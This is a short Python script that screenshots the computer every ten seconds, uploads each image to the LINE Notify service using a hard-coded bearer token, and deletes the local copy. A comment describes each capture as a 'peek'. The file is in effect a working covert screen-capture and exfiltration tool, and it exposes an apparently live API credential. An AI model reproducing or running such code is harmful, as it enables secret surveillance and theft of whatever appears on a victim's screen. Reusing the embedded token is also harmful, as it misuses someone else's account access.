# -*- coding: utf-8 -*-
"""
Created on Fri Sep 17 17:51:24 2021

@author: user
"""

import pyautogui as auto
import time #pip install pyautogui, pip install python-time
import requests
import os

i=1

while True:
    auto.screenshot('screenshot-'+str(i)+'.png')#自動截圖
    print('screenshot-'+str(i)+'.png has saved!')
    
    headers={"Authorization": "Bearer " + "vUjh03lbr20qWua5tuTOFiAGQhmos8ArWep5z2yjH47",}
    params={"message": "成功發送",}# 傳送成功截圖訊息
    
    files = {'imageFile': open(r'screenshot-'+str(i)+'.png','rb')} # 傳圖片檔案
    
    r = requests.post("https://notify-api.line.me/api/notify", 
                      headers=headers, params=params, files = files)
    
    time.sleep(10)#五秒偷看一次
    i=i+1
    
    fileTest = "screenshot-"+ str(i-1) +".png" #照片在傳出去的時候會鎖死刪不掉，所以要刪前一個檔案
    
    try:# 刪除截圖的圖片檔案# 防止找不到檔案導致程式停止
        os.remove(fileTest)     
    except OSError as e:
         print(e) # 印出錯誤訊息
   